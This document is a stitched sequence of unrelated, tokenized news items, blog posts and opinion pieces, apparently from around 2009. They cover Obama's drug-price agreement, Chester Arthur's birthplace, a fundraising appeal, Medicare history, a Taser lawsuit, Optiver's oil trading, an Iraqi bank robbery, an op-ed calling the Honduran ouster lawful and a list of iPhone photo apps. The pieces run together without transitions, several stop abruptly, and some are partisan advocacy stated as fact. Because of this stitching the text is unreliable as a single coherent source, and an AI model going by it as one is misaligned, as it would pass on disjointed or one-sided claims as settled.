In June , Obama announced an agreement with the drug companies to cut the price of medicines by $ 80 billion over the next ten years .
Now , $ 80 billion might sound like a huge amount of savings , but the bigger question is how much savings is this really ?
So Greg Palast rummaged through the government health statistics , and discovered that spending on prescription drugs is projected to be $ 3.6 trillion dollars .
In other words , $ 80 billion is only a 2 % savings .
Hmmm , does n’t sound quite as good , does it ?
But it gets worse .
Much worse .
First of all , this $ 80 billion “ savings ” is not on what we are currently paying for drugs , it is a savings over the amount the drug companies were planning on raising their prices .
In plain English , the drug companies were planning on doubling the price of drugs over the next ten years , but now they will limit themselves to only raising prices 1.98 times .
How absolutely generous .
What did big pharma get in return for this $ 80 billion pledge ?
Obama promised them that the government would not be allowed to bargain down drug prices , nor would the government be allowed to buy cheaper drugs from Canada .
Mind you , according to the New England Journal of Medicine , thirteen countries in Europe negotiate drug prices , and they are able to reduce the price of drugs between 35 % to 55 % .
Even in the US , the Veterans Administration is allowed to negotiate the price of drugs , and they save 40 % .
( Medicare is not allowed to negotiate drug prices , a ban that Obama promised to overturn . )
Suddenly , $ 80 billion sounds quite small .
Incidentally , when I lived briefly in New Zealand I had to refill some prescriptions , and because I did n’t qualify for their national health plan I had to pay full price for them .
I was shocked to find that full price there was less than my prescription co-pay for drugs in the US .
UPDATE : Obama Reverses Stand on Drug Industry Deal .
FAIRFIELD , Vt. - Finding the birthplace of President Chester A. Arthur is easy : Turn left at Town Hall and its Chester A. Arthur Conference Room , go past Chester ’s Bakery , and turn right on Chester A. Arthur Road .
Nearly 5 miles up the winding two - lane country road , past rolling hills and dairy farms , is the tiny Chester A. Arthur Historic Site , proclaiming the spot where the nation ’s 21st president was born in a cottage .
Or was he ?
Nearly 123 years after his death , doubts about his US citizenship linger , thanks to lack of documentation and a political foe ’s assertion that Arthur was really born in Canada - and was therefore ineligible for the White House , where he served from 1881 to 1885 .
Long before “ birthers ’’ began questioning the citizenship of President Obama , similar questions were raised about the early years of Arthur , an accidental president who ascended to the job after President James Garfield was assassinated .
“ It ’s an old rumor that wo n’t die , political slander , ’’ said John Dumville , who runs Vermont ’s historic sites and knows well the legend .
The Constitution says only a “ natural - born citizen ’’ may serve as president .
The issue has received renewed interest because of legions of Obama doubters who claim his Hawaiian birth certificate is fake and that he was born in Kenya .
But the Arthur birthplace question came up before the Internet was around to spread such theories .
Known as Vermont ’s “ other president ’’ - Calvin Coolidge was born in Vermont - Arthur was the son of a Baptist minister whose first assignment was this small town of 1,916 people in the heart of northern Vermont dairy country .
He was born Oct. 5 , 1829 , but later in life , he lied about the year .
Even his gravestone lists 1830 , though Arthur family bibles at the Library of Congress in Washington say 1829 .
The family moved often , and by 1835 had left Vermont .
Arthur went on to become a teacher , lawyer , and political operative , serving as quartermaster general for the state of New York during the Civil War and later Collector of the Port of New York , appointed by President Ulysses Grant .
The focus on his place of birth became an issue in the 1880 presidential campaign , when Arthur was tapped to be the running mate for Garfield .
According to historical accounts , Republican bosses wanted him to provide proof of his birthplace , but he never did .
Democrats , meanwhile , hired a lawyer named Arthur Hinman who sought to discredit Arthur , alleging that he was born in Dunham , Quebec , about 47 miles north of Fairfield .
Hinman traveled to Vermont and Canada to research Arthur ’s past , eventually concluding that Arthur was born in Canada but appropriated the birth records of a baby brother who was born in Fairfield , but died as an infant .
He later incorporated the findings into a book titled “ How A British Subject Became President of the United States . ’’
Arthur , who served from 1881 to 1885 , never publicly addressed the allegation .
Vermont officials hold fast to their claim on Arthur ’s birth , but have little to back it up .
The state of Vermont did n’t begin receiving birth records until 1857 , according to state archivist Gregory Sanford .
The birth records at the Town of Fairfield go back no further , Town Clerk Amanda Forbes said .
Arthur biographer Thomas C. Reeves , a former University of Wisconsin history professor who wrote “ Gentleman Boss ’ ’ in 1975 , debunked the born - in - Canada assertion .
“ This was a little campaign trick , in an era when politics were just as dirty as they are now , ’’ Reeves said .
“ It did n’t threaten him in any way . ’’

Today , we are announcing our latest TV ad -- calling out the " Blue Dog Democrat " leader , Rep. Mike Ross ( Arkansas ) , for his special - interest contributions from the health industry .
Click here to see the ad and help us air it in Arkansas .
This ad includes a substantial cameo by Keith Olbermann , and for those of you who know my voice , you 'll recognize a certain narrator .
Congressman
Ross recently switched his position on the public health insurance option -- opposing it , despite the fact that Arkansas voters favor it 55 % to 38 % .
He 's also taken over $ 900,000 from special interests that oppose reform .
We obtained footage of Ross complaining about how much money he needs to raise to get elected -- so in the ad , we challenge him to support the bipartisan bill in Congress to replace special - interest - funded elections with citizen - funded elections .
We need to raise $ 15,000 to air our ad 200 times in Arkansas -- can you chip in ?
If we surpass that goal , we 'll air the ad in Washington , DC as well -- so all of Congress sees it .
This ad is bound to make a splash .
Any help getting it on the air is most appreciated .
Thanks for helping to Change Congress .
Tokyo Tire Playground
This playground , covered completely with sand , is filled with big tires in every combination : dinosaurs reaching to the sky , tire “ monsters , ” regular and tire swings , bridges , slides , climbing equipment , and loose tires lying everywhere for free play .
Approximately 3,000 old tires are used to set up this playground .
I wish there was a playground like this in my neighborhood !
The healthcare reform debate we see now was never played out in the public arena for Medicare yet the inside wranglings were filled with many of the same fears . concerns and ideals we see today .
I remember " old folks homes " where America stashed it 's elederly who did not have the means to afford old age .
My sorority did 3 chairty events a year for them and sang Christmas Carols .
They were small packets we made up with a pretty pink or blue comb and a nice hanky with some hard candies and a few handmade trinkets .
I remember the tears rolling down wrinkled faces while shaky hands accepted these little gift bags .
For most it was the only gift they would receive .
The homes were stinky and most times dark shabby places .
Not much better than the places we hid our memtally disabled citizens at the time .
I will admit I was afraid as a youth to go the the " nut houses " to sing or pass out gifts .
We all were and I regret that now .
The critics at the time although a tad more polite were using the same arguments we hear today .
Socialism
At the time it was enacted , conservatives strongly opposed Medicare , warning that a government - run program would lead to socialism in America :
Ronald Reagan : " if you do n’t stop Medicare and I do n’t do it , one of these days you and I are going to spend our sunset years telling our children and our children ’s children what it once was like in America when men were free . "
George H.W. Bush : Described Medicare in 1964 as " socialized medicine . "
Barry Goldwater : " Having given our pensioners their medical care in kind , why not food baskets , why not public housing accommodations , why not vacation resorts , why not a ration of cigarettes for those who smoke and of beer for those who drink . "
Bob Dole :
In 1996 , while running for the presidency , Dole stated that he was one of 12 House members who voted against creating Medicare in 1965 .
" I was there , fighting the fight , voting against Medicare ... because we knew it would n’t work in 1965 . "
Libertarians and the Austrian School of economics suggest that social programs such as Medicare fail to participate in the price mechanism of competition .
Bypassing market forces allows for arbitrary pricing and increased utilization of resources by the public .
I guess the seniors now do n't agree for the most part with these men because Medicare is now an American way of life .
It is ironic some of their own ppolitical heroes of the past would have made sure they were delegated to those same " old folks homes " I used to visit .
LBJ went to Harry Truman 's Library to sign him up as the first recipient of Medicare .
It is well known Truman was the pioneer of health care for all Americans s it was a fitting tribute .
I get weary and tired of trying as the song says but listening to those LBJ tapes gave me new energy to fight old class barriers put up in the cobblestones of colonial roads .
Embedded in our history is a glorious ooportunity for liberty .
The holes and bumps in that history are slavery . women 's sufferage , and ignorance that allowed " nut houses " and " old folks homes " that his our imperfections until people fought to force the right laws were passed to make us a more perfect union .
I was too young to understand what happened on July 30th 1965 but I am glad it did happen .
LBJ was a flawed president but some of our greatest programs were envisioned by others but enacted by him .
Yes he did fight for Medicare and he fought the same fight we are now .
His tapes show this .
I thank him now for that .
Here is a link for his phone conversations .
C- Span is airing some of the with brilliant historians explaining some of the agendas behind the conversations .
C- Span .
Org will give you a link to the former airings for livestrean at your convenience .
They were right then and we must fight now because we are right .
There is no greater purpose for our nation than to continue to strive for that pursuit of happiness for all .
These tapes are simply a reminder of that fact .

Special LBJ Tapes the 1965 Medicare Bill
As Congress continues work on health care legislation , hear comparisons to the 1965 Medicare bill from President Johnson 's 1964 and 1965 calls .
Listen to LBJ plan to win approval for the measure in conversations with his chief Congressional aide Larry O'Brien , Sen. Albert Gore Sr. , father of the future Vice President , and House Ways and Means Cmte. Chairman Wilbur Mills .
Historian David Shreve provides context and background for these conversations .
Farm workers helped firefighters rescue the cow
A cow was freed by firefighters after it became trapped upside - down between two walls .
The animal had jumped over a fence and became stuck between a garage and outer wall in Hollygate Road , Dalton - in - Furness , on Monday afternoon .
Firefighters attached rescue harnesses and dislodged the animal by using a mobile digger as a small crane .
It is believed the cow had been unsettled by a vehicle being used in the farmer 's field .
Barrow station manager Roger Exley , of Cumbria Fire and Rescue Service , said : " The cow had become quite anxious and decided to take after the farmer 's vehicle .
" It approached quite a high - sided wall and fence , managed somehow to straddle that fence and ended up in a two - foot wide ditch - basically trapping itself upside down between two walls . "
Farmer Dave Mutton said the animal , valued at about £ 2,000 , was lucky not to have sustained serious injuries .
He said : " We got the vet out to check her over and he gave her an anti-inflammatory injection .
A few hours later she was grazing away as normal .
" Cows are usually quite intelligent , but this one was a bit silly . "
What started as a dinner out with her husband and friends in downtown Minneapolis ended with a Plymouth woman handcuffed , on the receiving end of a Taser shot and barefoot in a jail cell for at least three hours .
On Monday , Sandra Brown 's lawsuit from the Oct. 8 , 2005 , incident was settled with an agreement from Golden Valley to pay her $ 200,000 for her federal civil rights and excessive - force claims .
Brown , 57 , said she suffered bruises on her wrists and arm and went on anti-anxiety medicine for the first time in her life after the incident .
She said she remains wary of police .
" I would think twice before I dialed 911 even if I was in trouble , " she said .
" I truly believed the police were there to protect you , and that belief is not so true anymore . "
Jon Iverson , who represented Golden Valley , said the decision to settle was not an admission of wrongdoing .
" If we would have tried this case , we would have had an aggressive defense , " Iverson said .
But the League of Minnesota Cities Insurance Trust , which insures Golden Valley and some 800 cities in Minnesota , decided to settle rather than take its chances with a federal jury , he said .
Brown 's lawyer , Paul Applebaum , said : " $ 200,000 sounds like an admission of misconduct to me .
Most police brutality cases are settled for a nuisance value of $ 2,500 . "
As the use of Tasers has increased in recent years , so has debate about them .
While officers consider them a safe , nonlethal form of controlling a suspect , others raise concerns about the danger of injury and possibly death from their use .
The devices have been criticized by humanitarian and civil rights groups who contend that several hundred people have died since 2001 after being shot by Tasers and that Taser shocks have contributed to or caused at least 50 of the fatalities .
Yet , police across the country increasingly are equipping themselves with Tasers , and supporters of the weapons say many more lives have been saved because officers avoided firing bullets .
The current case
In the case settled Monday , the October 2005 evening started at 5 p.m. with a vodka for Sandra Brown and a whiskey for her husband , Richard .
They put the empty glasses in their car after finishing the drinks in their driveway , court documents say .
At 6:30 p.m. , they met friends for dinner in Minneapolis .
Sandra Brown had a vodka , a glass of wine , coffee and water with dinner and says she was not drunk .
Her husband had a couple of glasses of wine .
On their way home in their 2004 Chrysler Pacifica shortly after midnight , the Browns were pulled over allegedly because Richard Brown was driving 70 miles per hour in a stretch of Interstate 394 with a 55 - mph speed limit .
Police also say he was driving erratically , changing lanes without signaling and weaving across the center line .
In the formal legal response , the city said a St. Louis Park police officer pursued Richard Brown for 2.5 miles before he pulled over .
Richard Brown , 66 , thought the officer was trying to stop another vehicle and tried to get out of the way , court documents said .
Brown pulled over just before the Louisiana Avenue exit .
Sandra Brown 's lawsuit alleges that her husband tried to get out of the Pacifica but was told by St. Louis Park police to stay inside .
" He was then forcibly removed from the vehicle , handcuffed and placed in a squad car without any type of explanation to Sandra Brown , " the suit said .
Scared for her husband , she called 911 to try to determine why her husband was restrained and in custody .
Golden Valley police officer Rob Zarrett walked to her car and " screamed " at her , ordering her off the phone , according to the lawsuit .
She told him she was on the phone with dispatch and he took her phone , threw it and used his Taser gun to " shock and / or disable " her , the suit said .
Transcripts and taped conversations of actions that took place in 2007 , included in the commission ’s case , reveal the secretive workings of high - frequency trading , a fast - growing Wall Street business that is suddenly drawing scrutiny in Washington .
Critics say this high - speed form of computerized trading , which is used in a wide range of financial markets , enables its practitioners to profit at other investors ’ expense .
Traders in the Chicago office of Optiver openly talked among themselves of “ whacking ” and “ bullying up ” the price of oil .
But when called to account by officials of the New York Mercantile Exchange , they described their actions as just “ providing liquidity . ”
In July 2008 , the commission charged Optiver with manipulating the price of oil ; negotiations over a settlement continue .
In the cutthroat world of high - frequency trading , success is a function of speed , secrecy and often a bit of intrigue .
Few have been more adroit at these arts than Optiver .
Optiver describes itself as one of the world ’s leading liquidity providers , a trading firm that uses its own capital to make markets .
It seeks to profit on razor - thin price differences — which can be as small as half a penny — by buying and selling stocks , bonds , futures , options and derivatives .
( Derivatives represent about 65 percent of its business , equities 25 percent , and commodities and others make up the remaining 10 percent . )
But the extent to which market making ( providing liquidity to markets that need it ) and proprietary trading ( the pursuit of pure profit with a firm ’s own money ) can properly coexist has become a thorny question for regulators .
They are grappling with an exploding business that makes up as much as half the overall trading in the United States and a growing share in Europe as well .
Tanno Massar , a public relations executive working for the company , said that Optiver had no comment on the case .
As for Optiver ’s trading conduct , Mr. Massar said that the company was committed to transparent markets and that there was no inherent conflict between pursuing profits and making markets — a view that top Optiver officials had long been trying to convey to regulators when their oil trades were being investigated .
But their pleadings fell on deaf ears .
During a tense conference call in 2007 , Thomas Lasala , the chief regulator for Nymex , made his doubts clear about Optiver ’s trading strategies .
“ The market seems to move in reaction to your orders , ” he said , according to a transcript of the conversation .
“ And I do n’t think that is a market - making strategy . ”
It could well be that Optiver ’s cowboy trading tactics are unique to the company .
But as concern grows over the effect that high - octane computerized trading is having on markets worldwide , Optiver ’s conduct in the oil futures market raises questions as to whether the relentless competition of this business is forcing companies to engage in similar practices .
“ These are proprietary trading shops that are masquerading as market makers , ” said Tim Quast of Modern IR , a consulting firm that advises corporations on market structure issues .
The Securities and Exchange Commission has opened up an investigation into high - speed - trading practices , in particular the ability of some of the most powerful computers to jump to the head of the trading queue and — in a fraction of a millisecond — capture the evanescent trading spread before the rest of the market does .
The spread of high - frequency trading in Europe has lagged behind the United States .
But it is now experiencing rapid growth , spurred by arbitrage opportunities that have attracted large American firms like Getco and Madison Tyler .
Amsterdam , as much as if not more than London , has been the breeding ground for local firms seeking the same advantages .
Companies like Optiver , All Options , Tibra and others have assumed influential positions in Europe , moving from their original expertise in trading options to the full gamut of stocks , bonds and derivatives as well .
Called low - latency trading , this blend of speed and opportunism is the essence of Optiver ’s business model .
It deploys a sophisticated software system called F1 that can process information and make a trade in 0.5 milliseconds — using complex algorithms that let its computers think like a trader .
And the company is so careful about preserving its secrets that when some traders and engineers left for a rival operation recently , Optiver hired private investigators and subsequently sued the former employees on charges of making off with intellectual property .
Founded in 1986 by an options trader named Johann Kaemingk , Optiver has grown far beyond its roots in Amsterdam to trade on exchanges all over the world .
It employs 600 people and , judging from the many positions advertised on its Web site , it is still in a hiring mode .
Given the vicious competition that exists in the industry , Optiver and other companies have become creative in attracting the smartest people in finance .
The dress code is aggressively casual .
The company provides free breakfasts , lunches and Friday afternoon drinks , as well as chair massages .
And in one recruiting Web video ( no longer online ) , an Optiver trader sitting before four giant trading screens is seen ogling two skimpily clad women as they sit on his thighs .
To enjoy these professional fruits , applicants need to subject themselves to three math - based tests to test facility with numbers and the ability to think clearly under pressure .
For one of the tests , 80 questions must be answered in under 8 minutes .
Sample questions include 0.034 times 0.2 , or , if you have a cube made of 10 by 10 smaller cubes , how many are facing the outside ?
Few of the applicants even get an interview : 80 to 90 percent of people who take the test fail it .
People who have worked at Optiver say the average age is young — under 30 — as the company has a policy of not hiring traders from rival institutions , preferring recent university graduates who can more easily embrace the firm ’s culture .
According to the Commodity Futures Trading Commission , which would not comment on the case , Optiver made about $ 1 million on its oil trading gambit .
While $ 1 million may not seem like a lot , recorded conversations reveal the extent to which the firm ’s trading practices broadly have enriched its employees .
In one exchange , Christopher Dowson , head of trading in Optiver ’s Chicago office and the mastermind behind the oil strategy , bragged to another employee about how he had bought a new speed boat with his share of the returns .
“ With these profits , might have to get a bigger one , ” he said .
And in another , Mr. Dowson acknowledges that Optiver was so aggressive in conducting its proprietary trades in some smaller stocks that their activities “ were as big as the volume traded on the day . ”
It is precisely this — high - powered computers and the swagger of those who operate them — that is causing worries over high - frequency trading ’s increasing sway .
“ The markets used to be about capital formation , ” said Mr. Quast , the consultant .
“ Now 80 percent of trading is driven by some form of statistical arbitrage .
We are buying into a statistical house of cards that could unravel very quickly . ”
When thieves shot dead eight guards and made off with $ 4.8 million in one of Iraq ’s biggest - ever bank heists last week , fingers quickly pointed at the Sunni-led insurgency .
Extremists must be turning to crime to finance their activities , so the hypothesis went , and $ 4.8 million would pay for a lot of bombs .
But after a series of arrests and a sweep of a government compound , Iraqi police say the culprits were Iraqi army officers attached to the elite unit guarding Shiite Vice President Adel Abdul Mehdi .
Four soldiers were in custody Sunday , including a captain and a lieutenant , and the money has been recovered , authorities said .
Four other soldiers are still being sought .

Officials have been quick to discount the possibility that Abdul Mehdi , or his powerful political faction , the Supreme Islamic Iraqi Council , were involved .
“ They executed the operation for personal reasons , exploiting their profession as officers in the army and their presence in the area , ” Interior Ministry spokesman Abdul Kareem Khalaf said during a news conference .
“ It had nothing to do with supporting terrorism , ” he said .
But the revelations have helped fuel perceptions that the biggest threat to Iraq ’s stability these days comes not so much from a greatly weakened insurgency but from within the ranks of its own institutions and political factions .

Iraq ’s Shiite - dominated government is notoriously corrupt and inefficient , and though the U.S. - trained security forces are credited with mostly maintaining peace in the month since the American troops finished withdrawing from Iraq ’s cities , they too are widely perceived as corrupt .
Many Iraqis suspect that much of the low - level violence still prevalent on the streets of Baghdad is being perpetrated by political factions within the coalition government as they jockey for power ahead of January ’s national elections .
Even attacks such as Friday ’s series of bombings against five Shiite mosques in Baghdad , in which 29 people died , ca n’t be definitively attributed to the militant group Al Qaeda in Iraq or the remnants of Saddam Hussein ’s Baath Party , the usual suspects in bombings , said Nabil Salim of Baghdad University ’s Center for International Studies .
“ They might do some attacks here and there but you ca n’t say every attack is Al Qaeda or the Baathists .
It is n’t useful , ” he said .
“ There is quite a connection between these attacks and political reasons .
Some people inside the system do n’t want stability in the Iraqi state . ”
Those suspicions were echoed last week by a senior U.S. military advisor who circulated a memo among news organizations in which he argued that American troops were serving no useful purpose in Iraq .

“ There is no longer any coherent insurgency , ” wrote Col. Timothy R. Reese , chief of the Baghdad Operations Command Advisory Team .
Rather , he said , violent attacks are being carried out by political factions with the goal of “ affecting their political standing within the existing power structures of Iraq . ”
Continued violence harms the reputation of Prime Minister Nouri Maliki , whose popularity soared after he oversaw sharp declines in attacks over the last two years , but who is now struggling to improve services and bolster the economy ahead of the elections .
With most of Iraq calmer than at any point since the 2003 U.S. - led invasion , it is no longer possible to blame poor services strictly on insurgent attacks .
This summer , electricity supplies are down sharply , with some neighborhoods receiving only two to four hours of power a day , while many areas are going without running water for days at a time .
In a speech to tribal leaders Saturday , a visibly frustrated Maliki accused factions within his government of holding up reconstruction projects in order to dent his popularity ahead of the elections .

“ Some are obstructing the release of allocations for electricity projects so that people can’t say the Maliki government improved the power supply , ” he said .
“ Stop this project , prevent this bill .
A project goes to parliament , but it is never voted upon .
Why ?
So that people ca n’t say Maliki accomplished anything . ”
The Sunni insurgency is still active in the northern city of Mosul , and a series of recent bombings in Al Qaeda in Iraq ’s former stronghold of the western province of Anbar has given rise to fears that the group is reviving there .
In the latest attack Sunday , five people died in a bombing at a market in the town of Haditha .
At least the Iraqi government was able to swiftly solve the bank robbery -- at first believed to involve nearly $ 7 million -- and expose the suspects , said Sami Askari , a Shiite legislator who is close to Maliki .
So sensitive was the discovery that elite Iraqi troops were involved , the Interior Ministry first approached Maliki and asked him what to do .
Maliki gave the go - ahead to arrest all the suspects , Askari said .
“ It was a genuine test of the prime minister , the Interior Ministry and all of us in the event we face such problems again , ” he told Al Hurra TV .
“ I think we all passed the test . ”

Times staff writers Raheem Salman and Caesar Ahmed contributed to this report .
Sometimes , the whole world prefers a lie to the truth .
The White House , the United Nations , the Organization of American States , and much of the media have condemned the ouster of Honduran President Manuel Zelaya this past weekend as a coup d'état .
That is nonsense .
In fact , what happened here is nothing short of the triumph of the rule of law .
To understand recent events , you have to know a bit about Honduras 's constitutional history .
In 1982 , my country adopted a new Constitution that enabled our orderly return to democracy after years of military rule .
After more than a dozen previous constitutions , the current Constitution , at 27 years old , has endured the longest .
It has endured because it responds and adapts to changing political conditions :
Of its original 379 articles , seven have been completely or partially repealed , 18 have been interpreted , and 121 have been reformed .
It also includes seven articles that cannot be repealed or amended because they address issues that are critical for us .
Those unchangeable articles include the form of government ; the extent of our borders ; the number of years of the presidential term ; two prohibitions – one with respect to reelection of presidents , the other concerning eligibility for the presidency ; and one article that penalizes the abrogation of the Constitution .
During these 27 years , Honduras has dealt with its problems within the rule of law .
Every successful democratic country has lived through similar periods of trial and error until they were able to forge legal frameworks that adapt to their reality .
France crafted more than a dozen constitutions between 1789 and the adoption of the current one in 1958 .
The US Constitution has been amended 27 times since 1789 .
And the British – pragmatic as they are – in 900 years have made so many changes that they have never bothered to compile their Constitution into a single body of law .
Under our Constitution , what happened in Honduras this past Sunday ?
Soldiers arrested and sent out of the country a Honduran citizen who , the day before , through his own actions had stripped himself of the presidency .
These are the facts :
On June 26 , President Zelaya issued a decree ordering all government employees to take part in the " Public Opinion Poll to convene a National Constitutional Assembly . "
In doing so , Zelaya triggered a constitutional provision that automatically removed him from office .
Constitutional assemblies are convened to write new constitutions .
When Zelaya published that decree to initiate an " opinion poll " about the possibility of convening a national assembly , he contravened the unchangeable articles of the Constitution that deal with the prohibition of reelecting a president and of extending his term .
His actions showed intent .
Our Constitution takes such intent seriously .
According to Article 239 : " No citizen who has already served as head of the Executive Branch can be President or Vice - President .
Whoever violates this law or proposes its reform [ emphasis added ] , as well as those that support such violation directly or indirectly , will immediately cease in their functions and will be unable to hold any public office for a period of 10 years . "
Notice that the article speaks about intent and that it also says " immediately " – as in " instant , " as in " no trial required , " as in " no impeachment needed . "
Continuismo – the tendency of heads of state to extend their rule indefinitely – has been the lifeblood of Latin America 's authoritarian tradition .
The Constitution 's provision of instant sanction might sound draconian , but every Latin American democrat knows how much of a threat to our fragile democracies continuismo presents .
In Latin America , chiefs of state have often been above the law .
The instant sanction of the supreme law has successfully prevented the possibility of a new Honduran continuismo .
The Supreme Court and the attorney general ordered Zelaya 's arrest for disobeying several court orders compelling him to obey the Constitution .
He was detained and taken to Costa Rica .
Why ?
Congress needed time to convene and remove him from office .
With him inside the country that would have been impossible .
This decision was taken by the 123 ( of the 128 ) members of Congress present that day .
Do n't believe the coup myth .
The Honduran military acted entirely within the bounds of the Constitution .
The military gained nothing but the respect of the nation by its actions .
I am extremely proud of my compatriots .
Finally , we have decided to stand up and become a country of laws , not men .
From now on , here in Honduras , no one will be above the law .

Best Buy is running a rather insane deal , where you get 50 percent off certain Xbox 360 titles by purchasing the first game at the full price , and the list of games that qualify for the deal is rather stunning .
Some of the titles are n't even out yet , so if you were planning on picking up both Halo 3 : ODST and Modern Warfare 2 , you can save $ 30 on the deal by getting them together through Best Buy .
A partial list of games and prices is included after the jump , and I 'm guessing you 'll be able to find at least two games you 've been meaning to pick up .

It 's important to keep your guests properly hydrated at a party , but it 's hard to not feel awfully demeaned while wandering around with a cocktail tray .
Since hiring servants is so passe , the solution is Table Robot from Laskmi - Do Corp , a two - wheeled , self - balancing bot that features a particularly unsteady looking design .
It 's tall and slender , balancing a tabletop on two scrawny little wheels , a feat it showed off at last week 's FOOMA Japan , Tokyo's biggest gathering for foodies and related geeks .
The natural comparison is to a Segway , but this is a full - fledged robot , capable of cruising around under remote control and , soon , following you around by voice , meaning a fresh and precisely balanced mohito may soon be just a word away .

The art of “ iPhoneography ” is no longer something to laugh at .
Photos taken and edited with iPhones have appeared on the front page of newspapers like the New York Times .
They ’ve even won awards thanks to photographers like Benjamin Lowry , a photojournalist who actively supports mobile photography .
Finding the right apps to edit photos can be intimidating , though .
Hundreds of photo effects and editing apps have emerged in the past years .
Deciding which apps to use could take hours of research , especially if you ’re new to iPhoneography .
To save you time , here are 30 of the most popular iPhone photography apps , organized by their strong points : shooting , all - in - one editing , extra editing , filters , panoramas , and cool effects .
Shooting
ProCamera is a robust shooting and editing app with just about anything you could want , including HDR .
It ’s one of the best apps for shooting , with plenty of features and a great interface .
Camera +
Camera + is also a fantastic app , and it ’s slightly cheaper than ProCamera .
It has anti-shake functions , clarity features , gyroscopes , split exposures , and focus points , plus some fun filters .
Its interface is also excellent .
Like Camera+ , Camera Genius makes your iPhone into a ‘ proper ’ camera , as far as that ’s possible : 6 x digital zoom , video with real - time zoom , anti-shake , timer , etc .
It even includes camera guides , a photography manual , and a DSLR mode for shooting .
All - in- One Editing
Produced by Google , Snapseed is an in - depth , high - quality editing app that ’s free .
It has extensive , easy - to - use tools , plus a number of cool filters .
What more could you want ?
If Snapseed was n’t the right fit for you , PicShop Lite is also free and worth a try .
It ’s simpler but still offers a lot of filters and editing tools .
One interesting extra : you can put stickers like hats and mustaches onto your photos .
It ’s geared towards social media as well , so sharing is easy .
Fan of Photoshop ?
If so , you should have this app .
You can combine , layer and enhance images without transferring them off your iPhone .
If you do want to tweak the image on your desktop , though , Adobe Photoshop Mix is fully integrated with Adobe CC , so that wo n’t be a problem .
Lightroom users have an app , too .
It ’s an excellent choice for photographers who want a photo app that covers everything : capturing , organizing , editing , and sharing their photos .
The app is free to download , but if you want to use certain editing tools ( like those for RAW files ) or sync your Lightroom photos with other devices or Adobe apps , you ’ll need to upgrade .
If you want something simple but effective , Picoli might be your best choice .
It ’s easy to use and has standard filters and photo editing functions ( crop , brightness , sharpness , contrast , etc. ) , as well as extra professional tools like tone curve correction .
One big advantage of Darkroom is that you do n’t need to import your photos before editing .
It has all the essential editing functions –but mainly , it ’s fast and convenient .
MaxCurve specializes in curves , but it has all the standard editing functions , too .
Although , with 23 curves to edit with , you may not need much else .
Enlight
The makers of Enlight claim that “ it ’s every photo app you ’ve ever needed , wanted , or dreamed of – combined into one powerful , beautifully designed photo editor . ”
And they may be right .
A lot of hobby photographers love Ultralight because of its simple , intuitive design .
It does n’t have any long , confusing menus you need to navigate .
You can make adjustments with a few finger taps , making all your edits fast and easy .
Though it does n’t offer the same level of in - depth edits as you ’ll find with Snapseed or Adobe Lightroom , it still gives you a good range of editing options and filters to choose from .
Extra Editing
Ever wish you could expand an image somehow ?
Or straighten it without losing size ?
AntiCrop can help you do just that .
It ’ll straighten and / or enlarge your photos without cropping anything out .
With Color Splash , it ’s easy to convert your color images into black and white with a bit of color left over .
First , you convert and fine - tune a photo into black and white ( or sepia ) .
Then , you use your finger as a brush to bring back some color .
That ’s all !
Did someone photobomb a perfect shot you took ?
TouchRetouch can help you fix that problem .
It ’s the only popular iPhone app that allows you to delete unwanted objects ( and people ) , as if they were never there .
With AfterFocus , it ’ll look like your iPhone photos were taken with a DSLR .
You just select an area of the image to focus on , and the app will give the background a realistic , DSLR - style blur .
Filters
Really , Hipstamatic should be under ‘ Basic Shooting ’ as well .
Some photographers use it as their go - to app for all shooting simply because of the wide range of lenses and retro - style film filters it offers .
Ben Lowry even used it for serious photojournalism , like capturing scenes in Kabul , Afghanistan in 2011 .
If you only want to pay for one app , this one ’s not a bad choice .
If you want to get your name out there , Instagram is definitely a platform you should be using .
Unlike other social networks , Instagram is mainly meant for mobile phones .
You can still use it with a desktop and a DSLR , but …
The app is faster and produces great , shareable photos .
It has an attractive , user - friendly interface with a nice range of filters .
It ’s a great way to combine photography and social media without taking up much time .
Though VSCO also has a good set of editing tools , we ’ve put it under filters because that ’s what the app is known for .
Its filters are among the best , subtle and gorgeous .
Besides offering filters and editing tools , VSCO has a built - in social network that ’s similar to Instagram , only more artistic .
The app is free to download , and if you like it , you can upgrade to VSCO X for $ 20 / yr .
This premium version will give you more filters and editing tools , plus educational content .
At first , Priime might not seem like an app for filters .
That ’s because its filters are a little different .
Rather than focusing on certain effects , they imitate the styles of some world - class photographers , who helped create the filters .
There are two versions of CameraBag : one for video and one for photos .
Both accomplish the same thing .
They apply high - quality filters and keep colors looking smooth , even with a lot of editing .
The app is made for professional photographers , but the interface is simple enough for anyone to use .
The filters offered by Lens Distortions are subtle and elegant .
They ’re based on natural effects , like fog or light flares , so your images look clean and authentic .
Mextures has more than 150 textures to choose from , along with over 200 formulas for creating beautiful images .
So , you can either sort through the impressive array of light leaks and film textures , or just click on a formula created by a top iPhone photographer .
Panoramas
360 Panorama does exactly what its name implies : it creates a 360° panorama not unlike what you can see on Google maps .
While you probably wo n’t need to use this app for every wide - angle shot , it ’s great for epic situations , like a mountain top view you want to capture in 360 .
DMD Panorama also does 180° and 360° panoramas using both the front and back cameras of the iPhone .
It ’s free , too , so you can compare it with 360 Panorama without any extra cost .
Cool Effects
o Snap ! specializes in time - lapse and stop motion photography .
It has an elegant user interface and great editing features for time - lapse and stop motion projects .
It ’s especially handy for photographers who want to experiment with stop motion and time - lapses , but do n’t know where to begin .
Photo booths have a long history , going back to 1889 .
Most photo booths are used for passport photos , but recently , they ’ve also become popular at parties and wedding receptions .
Instead of finding or renting a photo booth , though , you can just download Pocketbooth and create your own photo booth experience at home .
Take as many photos as you want and compile them into photo booth strips to print or upload on social media .
With Typorama , you can combine your photos with text and end up with attractive images regardless of your design ( in ) experience .
It ’ll save you time while still creating cool posters and inspirational images for Instagram , etc .
This editing app focuses on turning photos and videos into tilt - shift works of art .
If you ’ve never worked with tilt - shift photography before and want some support , Tilt Shift Video can be a great help .
Diptic has one purpose : creating photo and video collages .
It ’s perfect for showing off the images you created with all the other apps without exhausting your viewers .
In more than three decades practicing medicine , I have been heartened by remarkable discoveries and innovations resulting in new treatments or the prevention of serious disease .
But I have also been saddened by the erosion of public trust in medicine as a profession .
Indeed , the poor performance of our current healthcare system and the perverse incentives and spiraling costs that impact the practice of medicine have fed this erosion of trust .
Like many other doctors , I have looked to the prospect of reform as a way for America to reclaim its place as an international leader in healthcare , and for physicians to focus on patients rather than bureaucracy and the bottom line .
Undertaking such an important shift in how we deliver healthcare requires a robust national debate .
Some leaders , however , choose to rely on fear instead of facts to make their case .
